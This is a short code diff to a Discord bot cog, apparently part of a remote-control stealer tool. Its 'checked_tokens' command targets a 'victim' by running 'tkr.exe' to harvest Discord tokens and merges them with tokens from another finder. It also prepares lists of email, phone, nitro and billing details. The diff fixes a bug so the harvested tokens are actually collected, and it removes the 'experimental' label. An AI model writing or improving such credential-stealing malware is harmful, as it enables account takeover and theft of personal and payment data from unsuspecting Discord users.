@@ -14,7 +14,7 @@ class CheckedTokens(commands.Cog):
 
     @commands.slash_command( )
     async def checked_tokens(self, ctx, victim):
-        """[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens
+        """Decrypts and checks all Discord Tokens
 
         Parameters
         ----------
@@ -32,7 +32,7 @@ class CheckedTokens(commands.Cog):
             discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
             
             valid, email, phone, uname, nitro, bill, avatar, dcTks, idq = [], [], [], [], [], [], [], [], []
-            for a in discord_tokenz: tks.append(a.replace('"',''))
+            for a in discord_tokenz: dcTks.append(a.replace('"',''))
             
             webTks = self.bot.find_token()
             finalTks = list(dict.fromkeys(dcTks + webTks))
